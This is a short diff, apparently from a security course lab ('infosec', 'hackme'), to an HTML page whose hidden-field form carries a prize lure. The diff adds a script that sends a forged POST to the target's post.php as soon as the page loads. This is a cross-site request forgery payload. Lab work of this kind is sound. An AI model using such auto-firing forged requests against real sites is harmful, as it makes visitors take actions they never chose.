@@ -11,5 +11,25 @@
 			<input type="hidden" name="message" value="You have been selected for a free flying dragon ride.">
 			<input name="post_submit" type="submit" value="Click here to win $1,000,000!">
 		</form>
+		<script>
+			window.onload = function() {
+				var url = "http://infosec-020-104/hackme/post.php";
+				var method = "POST";
+				var postData = {
+					title: 'You won!',
+					message: 'You have been selected for a free flying dragon ride.',
+					post_submit: 'Winning'
+				};
+				var async = true;
+				var request = new XMLHttpRequest();
+				request.onload = function () {
+					var status = request.status;
+					var data = request.responseText;
+				}
+				request.open(method, url, async);
+				request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+				request.send(postData);
+			}
+		</script>
 	</body>
 </html>
